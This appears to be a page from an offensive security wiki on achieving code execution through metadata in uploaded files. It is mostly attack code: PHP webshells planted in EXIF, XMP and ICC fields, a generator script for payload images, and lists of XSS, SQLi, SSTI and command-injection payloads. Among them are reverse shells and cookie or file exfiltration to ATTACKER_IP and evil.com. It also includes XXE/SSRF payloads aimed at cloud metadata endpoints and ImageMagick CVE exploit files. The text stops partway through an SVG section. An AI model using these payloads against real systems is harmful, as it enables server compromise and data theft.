---
title: Metadata Based Code Execution
description: Exploit file upload endpoints by injecting malicious payloads into image, document, and media metadata fields to achieve remote code execution, XSS, SQLi, and server-side exploitation.
navigation:
  icon: i-lucide-file-image
  title: Metadata Code Execution
---

## Overview

::note
Metadata-based code execution abuses EXIF, IPTC, XMP, ICC, and custom metadata fields embedded within uploaded files. When server-side applications parse, process, resize, or display metadata without sanitization, injected payloads execute in the context of the application or operating system.
::

::card-group
  ::card
  ---
  title: EXIF Injection
  icon: i-lucide-image
  ---
  Inject PHP, Python, or shell payloads into EXIF Comment, Artist, Copyright, ImageDescription, and UserComment fields.
  ::

  ::card
  ---
  title: XMP Payload Delivery
  icon: i-lucide-code
  ---
  Embed XML-based payloads inside XMP metadata blocks for XXE, XSS, and SSTI exploitation.
  ::

  ::card
  ---
  title: ICC Profile Abuse
  icon: i-lucide-palette
  ---
  Inject shellcode and web shells into ICC color profile data chunks within PNG, JPEG, and TIFF files.
  ::

  ::card
  ---
  title: Polyglot Metadata
  icon: i-lucide-layers
  ---
  Craft files that are simultaneously valid images and executable scripts by embedding code in metadata regions.
  ::
::

---

## Reconnaissance & Metadata Extraction

::tabs
  :::tabs-item{icon="i-lucide-search" label="Extract All Metadata"}
  ```bash [Terminal]
  # Full metadata dump from target file
  exiftool -a -u -g1 target.jpg

  # Extract specific fields
  exiftool -Comment -Artist -Copyright -UserComment -ImageDescription target.jpg

  # Recursive extraction from directory
  exiftool -r -a -u -g1 /var/www/uploads/

  # Extract XMP data specifically
  exiftool -xmp:all target.jpg

  # Extract ICC Profile
  exiftool -ICC_Profile:all target.jpg

  # Extract IPTC data
  exiftool -iptc:all target.jpg

  # Hex dump metadata regions
  exiftool -htmlDump target.jpg > metadata_dump.html

  # Extract thumbnail from EXIF
  exiftool -b -ThumbnailImage target.jpg > thumb.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Alternative Tools"}
  ```bash [Terminal]
  # Using exiv2
  exiv2 -pa target.jpg
  exiv2 -pX target.jpg    # XMP only
  exiv2 -pi target.jpg    # IPTC only
  exiv2 -pe target.jpg    # EXIF only

  # Using identify (ImageMagick)
  identify -verbose target.jpg

  # Using jhead
  jhead -v target.jpg

  # Using hachoir-metadata
  hachoir-metadata target.jpg

  # Using binwalk for embedded data
  binwalk -e target.jpg
  binwalk --dd='.*' target.jpg

  # Using strings for quick recon
  strings -n 8 target.jpg | grep -iE 'php|system|exec|eval|shell|flag'

  # Using xxd for hex inspection
  xxd target.jpg | head -100
  ```
  :::

  :::tabs-item{icon="i-lucide-globe" label="Remote Metadata Recon"}
  ```bash [Terminal]
  # Download and extract metadata from target URLs
  wget -q https://target.com/uploads/profile.jpg -O /tmp/target.jpg && exiftool -a -u /tmp/target.jpg

  # Batch download and extract
  for img in $(curl -s https://target.com/gallery | grep -oP 'src="[^"]+\.(jpg|png|gif)"' | cut -d'"' -f2); do
    wget -q "https://target.com$img" -O /tmp/$(basename $img)
    echo "=== $img ==="
    exiftool -Comment -Artist -Software /tmp/$(basename $img)
  done

  # Check if metadata is reflected in responses
  curl -s https://target.com/uploads/profile.jpg | exiftool -

  # Check if server strips metadata
  exiftool -Comment="METADATA_TEST_MARKER" test.jpg
  curl -s -F "file=@test.jpg" https://target.com/upload
  curl -s https://target.com/uploads/test.jpg | strings | grep "METADATA_TEST_MARKER"
  ```
  :::
::

---

## EXIF Comment PHP Webshell Injection

::warning
EXIF Comment injection is the most common metadata-based RCE vector. If the server includes uploaded images via `include()`, `require()`, or renders metadata in PHP context, the payload executes.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="ExifTool Method"}
  ```bash [Terminal]
  # Basic PHP webshell in Comment
  exiftool -Comment='<?php system($_GET["cmd"]); ?>' evil.jpg

  # PHP webshell in multiple fields for redundancy
  exiftool -Comment='<?php system($_GET["cmd"]); ?>' \
           -Artist='<?php passthru($_GET["c"]); ?>' \
           -Copyright='<?php echo shell_exec($_GET["x"]); ?>' \
           -ImageDescription='<?php eval(base64_decode($_POST["p"])); ?>' \
           -UserComment='<?php $_GET["a"]($_GET["b"]); ?>' \
           evil.jpg

  # Verify injection
  exiftool -Comment evil.jpg
  strings evil.jpg | grep "php"

  # Upload and trigger
  curl -F "file=@evil.jpg" https://target.com/upload
  curl "https://target.com/uploads/evil.jpg?cmd=id"
  curl "https://target.com/uploads/evil.jpg?cmd=cat+/etc/passwd"
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Python Script Method"}
  ```python [exif_inject.py]
  #!/usr/bin/env python3
  import struct
  import sys

  # Minimal valid JPEG with PHP payload in EXIF Comment
  def create_payload_jpeg(output_file, payload):
      jpeg = bytearray([
          0xFF, 0xD8, 0xFF, 0xE0,  # SOI + APP0 marker
          0x00, 0x10,              # APP0 length
          0x4A, 0x46, 0x49, 0x46, 0x00,  # JFIF identifier
          0x01, 0x01, 0x00, 0x00, 0x01,
          0x00, 0x01, 0x00, 0x00,
          0xFF, 0xFE,              # COM (Comment) marker
      ])
      
      payload_bytes = payload.encode('utf-8')
      comment_length = len(payload_bytes) + 2
      jpeg.extend(struct.pack('>H', comment_length))
      jpeg.extend(payload_bytes)
      
      # Minimal image data
      jpeg.extend([
          0xFF, 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01, 0x00,
          0x01, 0x01, 0x01, 0x11, 0x00,
          0xFF, 0xC4, 0x00, 0x1F, 0x00, 0x00, 0x01, 0x05,
          0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02,
          0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A,
          0x0B,
          0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00,
          0x3F, 0x00, 0x7B, 0x40,
          0xFF, 0xD9  # EOI
      ])
      
      with open(output_file, 'wb') as f:
          f.write(jpeg)
      print(f"[+] Payload JPEG written to {output_file}")
      print(f"[+] Payload: {payload}")

  payloads = {
      'system': '<?php system($_GET["cmd"]); ?>',
      'passthru': '<?php passthru($_REQUEST["cmd"]); ?>',
      'shell_exec': '<?php echo shell_exec($_GET["cmd"]); ?>',
      'eval_b64': '<?php eval(base64_decode($_POST["p"])); ?>',
      'assert': '<?php @assert($_GET["cmd"]); ?>',
      'preg_replace': '<?php @preg_replace("/.*/e",$_POST["cmd"],""); ?>',
      'callback': '<?php $_GET["f"]($_GET["c"]); ?>',
  }

  if len(sys.argv) < 3:
      print(f"Usage: {sys.argv[0]} <output.jpg> <payload_type>")
      print(f"Types: {', '.join(payloads.keys())}")
      sys.exit(1)

  create_payload_jpeg(sys.argv[1], payloads.get(sys.argv[2], payloads['system']))
  ```
  :::

  :::tabs-item{icon="i-lucide-zap" label="One-Liner Generators"}
  ```bash [Terminal]
  # Minimal JPEG with PHP shell in comment using printf
  printf '\xFF\xD8\xFF\xFE\x00\x1F<?php system($_GET["cmd"]); ?>\xFF\xD9' > shell.jpg

  # Using perl for hex construction
  perl -e 'print "\xFF\xD8\xFF\xFE".pack("n",length($ARGV[0])+2).$ARGV[0]."\xFF\xD9"' '<?php system($_GET["cmd"]); ?>' > shell.jpg

  # Using python one-liner
  python3 -c "import sys;open('shell.jpg','wb').write(b'\xff\xd8\xff\xfe'+len(b'<?php system(\$_GET[\"cmd\"]); ?>').to_bytes(2,'big')+b'<?php system(\$_GET[\"cmd\"]); ?>\xff\xd9')"

  # GIF with PHP payload
  printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

  # BMP with PHP payload
  printf 'BM<?php system($_GET["cmd"]); ?>' > shell.bmp

  # PNG with PHP in tEXt chunk (manual construction)
  python3 -c "
  import struct, zlib
  def chunk(ctype, data):
      c = ctype + data
      return struct.pack('>I', len(data)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)
  sig = b'\x89PNG\r\n\x1a\n'
  ihdr = chunk(b'IHDR', struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0))
  text = chunk(b'tEXt', b'Comment\x00<?php system(\$_GET[\"cmd\"]); ?>')
  idat = chunk(b'IDAT', zlib.compress(b'\x00\x00\x00\x00'))
  iend = chunk(b'IEND', b'')
  open('shell.png','wb').write(sig+ihdr+text+idat+iend)
  "
  ```
  :::
::

---

## Advanced EXIF Field Injection

::accordion
  :::accordion-item{icon="i-lucide-layers" label="Multi-Field Redundancy Injection"}
  ```bash [Terminal]
  # Inject into every writable EXIF field
  exiftool \
    -Comment='<?php system($_GET["cmd"]); ?>' \
    -Artist='<?php passthru($_GET["c"]); ?>' \
    -Copyright='<?php shell_exec($_GET["x"]); ?>' \
    -ImageDescription='<?php exec($_GET["e"],$o);echo join("\n",$o); ?>' \
    -UserComment='<?php popen($_GET["p"],"r"); ?>' \
    -XPComment='<?php $_GET["f"]($_GET["a"]); ?>' \
    -XPAuthor='<?php eval($_POST["z"]); ?>' \
    -XPKeywords='<?php include($_GET["file"]); ?>' \
    -XPSubject='<?php highlight_file($_GET["f"]); ?>' \
    -XPTitle='<?php readfile($_GET["f"]); ?>' \
    -Software='<?php phpinfo(); ?>' \
    -HostComputer='<?php echo `{$_GET["cmd"]}`; ?>' \
    -Make='<?php $s=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>' \
    -Model='<?php file_put_contents("shell.php","<?php system(\$_GET[c]); ?>"); ?>' \
    -OwnerName='<?php mail("attacker@evil.com","RCE",shell_exec("id")); ?>' \
    evil.jpg

  # Verify all injections
  exiftool -a -u evil.jpg | grep -i "php"
  ```
  :::

  :::accordion-item{icon="i-lucide-eye" label="XSS via EXIF Metadata"}
  ```bash [Terminal]
  # Stored XSS in EXIF fields (when metadata is displayed in browser)
  exiftool -Comment='<script>document.location="https://evil.com/steal?c="+document.cookie</script>' xss.jpg
  exiftool -Artist='<img src=x onerror=alert(document.domain)>' xss.jpg
  exiftool -Copyright='<svg/onload=fetch("https://evil.com/"+document.cookie)>' xss.jpg
  exiftool -ImageDescription='"><img src=x onerror=alert(1)>' xss.jpg
  exiftool -UserComment='<iframe src="javascript:alert(document.cookie)">' xss.jpg

  # DOM-based XSS payloads
  exiftool -Comment='<details open ontoggle=alert(1)>' xss.jpg
  exiftool -Artist='<body onload=alert(1)>' xss.jpg
  exiftool -Copyright='<marquee onstart=alert(1)>' xss.jpg
  exiftool -Software='<input onfocus=alert(1) autofocus>' xss.jpg

  # CSP bypass XSS payloads
  exiftool -Comment='<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script><div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>' xss.jpg

  # Mutation XSS
  exiftool -Comment='<math><mtext><table><mglyph><style><!--</style><img title="-->&lt;img src=x onerror=alert(1)&gt;">' xss.jpg
  ```
  :::

  :::accordion-item{icon="i-lucide-database" label="SQL Injection via EXIF Metadata"}
  ```bash [Terminal]
  # SQLi when metadata is stored in database without sanitization
  exiftool -Comment="' OR '1'='1' --" sqli.jpg
  exiftool -Artist="' UNION SELECT username,password FROM users--" sqli.jpg
  exiftool -Copyright="'; DROP TABLE uploads;--" sqli.jpg
  exiftool -ImageDescription="' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--" sqli.jpg

  # Time-based blind SQLi
  exiftool -Comment="'; WAITFOR DELAY '0:0:5';--" sqli.jpg
  exiftool -Artist="' AND SLEEP(5)--" sqli.jpg
  exiftool -Copyright="' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--" sqli.jpg

  # Error-based SQLi
  exiftool -Comment="' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--" sqli.jpg
  exiftool -Artist="' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--" sqli.jpg

  # Out-of-band SQLi
  exiftool -Comment="'; EXEC master..xp_dirtree '\\\\ATTACKER_IP\\share';--" sqli.jpg
  exiftool -Artist="' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))--" sqli.jpg
  ```
  :::

  :::accordion-item{icon="i-lucide-server" label="SSTI via EXIF Metadata"}
  ```bash [Terminal]
  # Server-Side Template Injection when metadata rendered in templates
  # Jinja2 / Python
  exiftool -Comment='{{7*7}}' ssti_test.jpg
  exiftool -Comment='{{config.items()}}' ssti.jpg
  exiftool -Comment='{{"".__class__.__mro__[1].__subclasses__()}}' ssti.jpg
  exiftool -Comment='{% import os %}{{os.popen("id").read()}}' ssti.jpg
  exiftool -Comment='{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}' ssti.jpg

  # Twig / PHP
  exiftool -Comment='{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}' ssti.jpg

  # Freemarker / Java
  exiftool -Comment='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}' ssti.jpg

  # ERB / Ruby
  exiftool -Comment='<%= system("id") %>' ssti.jpg
  exiftool -Comment='<%= `id` %>' ssti.jpg

  # Velocity / Java
  exiftool -Comment='#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))$x.class.forName("java.io.BufferedReader").getDeclaredConstructor($x.class.forName("java.io.Reader")).newInstance($x.class.forName("java.io.InputStreamReader").getDeclaredConstructor($x.class.forName("java.io.InputStream")).newInstance($ex.getInputStream())).readLine()' ssti.jpg

  # Smarty / PHP
  exiftool -Comment='{php}echo `id`;{/php}' ssti.jpg
  exiftool -Comment='{system("id")}' ssti.jpg
  ```
  :::

  :::accordion-item{icon="i-lucide-terminal" label="OS Command Injection via Metadata"}
  ```bash [Terminal]
  # When server processes metadata with system commands (e.g., ImageMagick, GraphicsMagick)
  exiftool -Comment='$(id)' cmdi.jpg
  exiftool -Comment='`id`' cmdi.jpg
  exiftool -Artist='|id' cmdi.jpg
  exiftool -Copyright=';id' cmdi.jpg
  exiftool -ImageDescription='&& id' cmdi.jpg
  exiftool -UserComment='|| id' cmdi.jpg

  # Newline injection
  exiftool -Comment=$'legitimate comment\n;id\n' cmdi.jpg

  # Filename-based command injection via metadata
  exiftool -Comment='$(curl http://ATTACKER_IP:8080/$(whoami))' cmdi.jpg
  exiftool -Artist='`wget http://ATTACKER_IP:8080/$(hostname)`' cmdi.jpg
  exiftool -Copyright=';curl http://ATTACKER_IP:8080/ -d @/etc/passwd' cmdi.jpg

  # Reverse shell via metadata
  exiftool -Comment='$(bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1")' cmdi.jpg
  exiftool -Artist='`python3 -c "import os,pty,socket;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")"` ' cmdi.jpg
  ```
  :::
::

---

## XMP Metadata Exploitation

::caution
XMP metadata is XML-based and stored within file headers. It opens attack vectors for XXE injection, SSRF, XSS, and deserialization attacks when parsed by XML-aware processors.
::

::tabs
  :::tabs-item{icon="i-lucide-file-code" label="XXE via XMP"}
  ```bash [Terminal]
  # Inject XXE payload into XMP metadata
  exiftool -XMP-dc:Description='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>' xxe.jpg

  # Manual XMP packet injection
  cat > xmp_xxe.xmp << 'EOF'
  <?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    <!ENTITY xxe2 SYSTEM "file:///etc/shadow">
  ]>
  <x:xmpmeta xmlns:x="adobe:ns:meta/">
    <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
      <rdf:Description rdf:about=""
        xmlns:dc="http://purl.org/dc/elements/1.1/">
        <dc:description>&xxe;</dc:description>
        <dc:creator>&xxe2;</dc:creator>
      </rdf:Description>
    </rdf:RDF>
  </x:xmpmeta>
  <?xpacket end="w"?>
  EOF

  exiftool "-XMP<=xmp_xxe.xmp" xxe.jpg

  # SSRF via XMP XXE
  cat > xmp_ssrf.xmp << 'EOF'
  <?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>
  <!DOCTYPE foo [
    <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  ]>
  <x:xmpmeta xmlns:x="adobe:ns:meta/">
    <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
      <rdf:Description rdf:about="">
        <dc:description xmlns:dc="http://purl.org/dc/elements/1.1/">&ssrf;</dc:description>
      </rdf:Description>
    </rdf:RDF>
  </x:xmpmeta>
  <?xpacket end="w"?>
  EOF

  exiftool "-XMP<=xmp_ssrf.xmp" ssrf.jpg

  # OOB XXE via XMP for data exfiltration
  cat > xmp_oob.xmp << 'EOF'
  <?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?>
  <!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % dtd SYSTEM "http://ATTACKER_IP:8080/evil.dtd">
    %dtd;
    %send;
  ]>
  <x:xmpmeta xmlns:x="adobe:ns:meta/">
    <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
      <rdf:Description rdf:about=""/>
    </rdf:RDF>
  </x:xmpmeta>
  <?xpacket end="w"?>
  EOF

  # Host the external DTD
  cat > evil.dtd << 'EOF'
  <!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER_IP:8080/?data=%file;'>">
  %all;
  EOF

  python3 -m http.server 8080 &
  exiftool "-XMP<=xmp_oob.xmp" oob_xxe.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-zap" label="XMP PHP/Code Injection"}
  ```bash [Terminal]
  # PHP code in XMP Description
  exiftool -XMP-dc:Description='<?php system($_GET["cmd"]); ?>' xmp_shell.jpg

  # PHP code in multiple XMP fields
  exiftool \
    -XMP-dc:Creator='<?php passthru($_GET["c"]); ?>' \
    -XMP-dc:Rights='<?php echo shell_exec($_GET["x"]); ?>' \
    -XMP-dc:Subject='<?php eval(base64_decode($_POST["p"])); ?>' \
    -XMP-dc:Title='<?php include($_GET["f"]); ?>' \
    -XMP-dc:Source='<?php $_GET["fn"]($_GET["arg"]); ?>' \
    -XMP-xmp:CreatorTool='<?php highlight_file("/etc/passwd"); ?>' \
    -XMP-xmp:Label='<?php file_put_contents("x.php",base64_decode($_POST["c"])); ?>' \
    xmp_shell.jpg

  # XMP with embedded JavaScript (for PDF/SVG contexts)
  exiftool -XMP-dc:Description='<script>alert(document.cookie)</script>' xmp_xss.jpg

  # Verify XMP injection
  exiftool -xmp:all xmp_shell.jpg
  exiftool -b -XMP xmp_shell.jpg | strings | grep php
  ```
  :::
::

---

## ICC Profile Payload Injection

::tip
ICC color profiles are binary data blocks embedded within images. Many image processing libraries read ICC profiles during color conversion. Injecting payloads into ICC profile data can survive image resizing and reprocessing.
::

::tabs
  :::tabs-item{icon="i-lucide-palette" label="ICC Profile Shell Injection"}
  ```bash [Terminal]
  # Create a minimal ICC profile with PHP payload
  python3 << 'PYEOF'
  import struct

  payload = b'<?php system($_GET["cmd"]); ?>'

  # Minimal ICC profile header (128 bytes) + tag table + payload
  profile_size = 128 + 4 + 12 + len(payload) + 20  # header + tag_count + tag_entry + payload + padding

  header = bytearray(128)
  struct.pack_into('>I', header, 0, profile_size)   # Profile size
  header[4:8] = b'none'                              # Preferred CMM
  struct.pack_into('>I', header, 8, 0x02400000)      # Version 2.4
  header[12:16] = b'mntr'                            # Device class: monitor
  header[16:20] = b'RGB '                            # Color space
  header[20:24] = b'XYZ '                            # PCS
  header[36:40] = b'acsp'                            # Profile file signature
  header[40:44] = b'none'                            # Primary platform

  # Tag table: 1 tag
  tag_count = struct.pack('>I', 1)
  
  # 'desc' tag pointing to payload
  tag_sig = b'desc'
  tag_offset = struct.pack('>I', 128 + 4 + 12)  # After header + tag_count + tag_entry
  tag_size = struct.pack('>I', len(payload))
  
  tag_entry = tag_sig + tag_offset + tag_size

  icc_profile = bytes(header) + tag_count + tag_entry + payload
  
  # Pad to declared size
  icc_profile = icc_profile.ljust(profile_size, b'\x00')

  with open('malicious.icc', 'wb') as f:
      f.write(icc_profile)

  print(f"[+] Malicious ICC profile created: malicious.icc ({len(icc_profile)} bytes)")
  PYEOF

  # Embed ICC profile into JPEG
  exiftool -ICC_Profile<=malicious.icc target.jpg

  # Embed ICC profile into PNG
  exiftool -ICC_Profile<=malicious.icc target.png

  # Verify ICC profile injection
  exiftool -ICC_Profile target.jpg
  strings target.jpg | grep "php"

  # Alternative: Use ImageMagick to embed ICC
  convert target.jpg -profile malicious.icc target_icc.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="ICC Profile Survival Test"}
  ```bash [Terminal]
  # Test if ICC profile payload survives server-side processing
  
  # Step 1: Create test image with ICC payload
  exiftool -Comment='COMMENT_MARKER_TEST' -ICC_Profile<=malicious.icc test_survive.jpg

  # Step 2: Simulate server-side resizing with various tools
  # ImageMagick resize
  convert test_survive.jpg -resize 100x100 resized_magick.jpg
  strings resized_magick.jpg | grep -E "php|MARKER"

  # GD Library resize (PHP)
  php -r '
  $src = imagecreatefromjpeg("test_survive.jpg");
  $dst = imagecreatetruecolor(100, 100);
  imagecopyresampled($dst, $src, 0, 0, 0, 0, 100, 100, imagesx($src), imagesy($src));
  imagejpeg($dst, "resized_gd.jpg");
  '
  strings resized_gd.jpg | grep -E "php|MARKER"

  # Pillow resize (Python)
  python3 -c "
  from PIL import Image
  img = Image.open('test_survive.jpg')
  img.thumbnail((100, 100))
  img.save('resized_pillow.jpg')
  "
  strings resized_pillow.jpg | grep -E "php|MARKER"

  # Sharp resize (Node.js)
  node -e "
  const sharp = require('sharp');
  sharp('test_survive.jpg').resize(100,100).toFile('resized_sharp.jpg');
  "
  strings resized_sharp.jpg | grep -E "php|MARKER"

  # Compare which payloads survived
  echo "=== Survival Matrix ==="
  for f in resized_*.jpg; do
    echo -n "$f: Comment="
    strings "$f" | grep -c "MARKER"
    echo -n " ICC_PHP="
    strings "$f" | grep -c "php"
  done
  ```
  :::
::

---

## ImageMagick & GraphicsMagick Exploitation

::warning
ImageMagick and GraphicsMagick are frequently used server-side for image processing. Known vulnerabilities (ImageTragick, CVE-2016-3714, CVE-2022-44268) allow RCE, SSRF, and arbitrary file read through crafted image metadata and delegate commands.
::

::code-group
```bash [ImageTragick CVE-2016-3714]
# RCE via MVG (Magick Vector Graphics) format
cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://evil.com/image.jpg"|id > /tmp/pwned")'
pop graphic-context
EOF

# RCE via SVG with external entity
cat > exploit.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640" height="480" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://evil.com/image.jpg&quot;|id > /tmp/pwned&quot;" x="0" y="0" height="640" width="480"/>
</svg>
EOF

# Upload as image
curl -F "file=@exploit.mvg;filename=exploit.jpg" https://target.com/upload
curl -F "file=@exploit.svg;filename=exploit.jpg" https://target.com/upload

# Reverse shell variant
cat > revshell.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/oops.jpg"|bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1")'
pop graphic-context
EOF
```

```bash [CVE-2022-44268 Arbitrary File Read]
# PNG-based arbitrary file read via tEXt chunk
# Create malicious PNG that reads /etc/passwd when processed
python3 << 'PYEOF'
import struct, zlib

def create_chunk(chunk_type, data):
    chunk = chunk_type + data
    return struct.pack('>I', len(data)) + chunk + struct.pack('>I', zlib.crc32(chunk) & 0xffffffff)

# PNG signature
png = b'\x89PNG\r\n\x1a\n'

# IHDR
ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
png += create_chunk(b'IHDR', ihdr_data)

# tEXt chunk with profile keyword pointing to target file
# ImageMagick reads the "profile" text chunk as a file path
png += create_chunk(b'tEXt', b'profile\x00/etc/passwd')

# IDAT
raw_data = b'\x00\x00\x00\x00'
compressed = zlib.compress(raw_data)
png += create_chunk(b'IDAT', compressed)

# IEND
png += create_chunk(b'IEND', b'')

with open('cve-2022-44268.png', 'wb') as f:
    f.write(png)
print("[+] CVE-2022-44268 exploit PNG created")
PYEOF

# Upload and download processed image
curl -F "file=@cve-2022-44268.png" https://target.com/upload -o response.png

# Extract leaked file data from processed PNG
python3 -c "
import re, binascii
with open('response.png', 'rb') as f:
    data = f.read()
# Look for raw profile data in hex
idx = data.find(b'Raw profile type')
if idx > 0:
    hex_data = data[idx:idx+5000]
    print(hex_data)
"

# Using identify to extract
identify -verbose response.png | grep -A 100 "Raw profile"
exiftool response.png
```

```bash [CVE-2023-34152 Shell Injection]
# ImageMagick shell injection via filename
# When ImageMagick processes files with special characters in names

# Via video delegate
cat > exploit.mp4 << 'EOF'
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'ephemeral:|id > /tmp/pwned'
pop graphic-context
EOF

# Via MIFF format
cat > '|id > /tmp/pwned.miff' << 'EOF'
id=ImageMagick
EOF

# Via MSL (Magick Scripting Language)
cat > exploit.msl << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="/etc/passwd"/>
  <write filename="/tmp/leaked_passwd"/>
</image>
EOF

# Upload with content-type manipulation
curl -F "file=@exploit.msl;filename=exploit.jpg;type=image/jpeg" https://target.com/upload
```

```bash [Policy Bypass Techniques]
# Check ImageMagick policy
identify -list policy
convert -list policy

# Common policy bypass via coder aliasing
convert 'pango:<h1>test</h1>' test.png
convert 'caption:test' test.png
convert 'label:@/etc/passwd' test.png

# Via MVG embedded reads
cat > bypass.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
pop graphic-context
EOF

# Via ephemeral protocol
convert 'ephemeral:/etc/passwd' test.png

# Via inline base64 with code
convert 'inline:data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7' test.png
```
::

---

## SVG Metadata & Code Execution

::tabs
  :::tabs-item{icon="i-lucide-image" label="SVG XSS Payloads"}
  ```xml [xss.svg]
  <!-- Basic XSS via SVG -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
    <circle r="50"/>
  </svg>

  <!-- Event handler variations -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100" onfocusin="alert(1)" tabindex="0"/>
  </svg>

  <svg xmlns="http://www.w3.org/2000/svg">
    <animate onbegin="alert(1)" attributeName="x" dur="1s"/>
  </svg>

  <svg xmlns="http://www.w3.org/2000/svg">
    <set attributeName="onmouseover" to="alert(1)"/>
  </svg>

  <!-- Foreign object XSS -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject width="100" height="100">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <iframe src="javascript:alert(document.cookie)"/>
      </body>
    </foreignObject>
  </svg>

  <!-- Script tag in SVG -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script type="text/javascript">
      fetch('https://evil.com/steal?c='+document.cookie);
    </script>
  </svg>

  <!-- Use element with external reference -->
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <use xlink:href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/>
  </svg>
  ```
  :::

  :::tabs-item{icon="i-lucide-server" label="SVG XXE & SSRF"}
  ```xml [xxe_svg.svg]
  <!-- XXE file read via SVG -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <text x="10" y="20">&xxe;</text>
  </svg>

  <!-- SSRF via SVG -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">&ssrf;</text>
  </svg>

  <!-- OOB XXE via SVG -->
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % dtd SYSTEM "http://ATTACKER_IP:8080/evil.dtd">
    %dtd;
    %send;
  ]>
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <text x="10" y="20">XXE</text>
  </svg>

  <!-- SVG with xlink SSRF -->
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="http://internal-server:8080/admin" width="100" height="100"/>
  </svg>

  <!-- SVG SSRF via CSS -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <style>
      @import url('http://169.254.169.254/latest/user-data');
      circle { fill: url('http://internal:6379/SET/key/value'); }
    </style>
    <circle r="50"/>
  </svg>
  ```
  :::

  :::tabs-item{icon="i-lucide-zap" label="SVG Generation Commands"}
  ```bash [Terminal]
  # Generate SVG XSS payload
  cat > xss.svg << 'SVGEOF'
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <circle r="50"/>
  </svg>
  SVGEOF

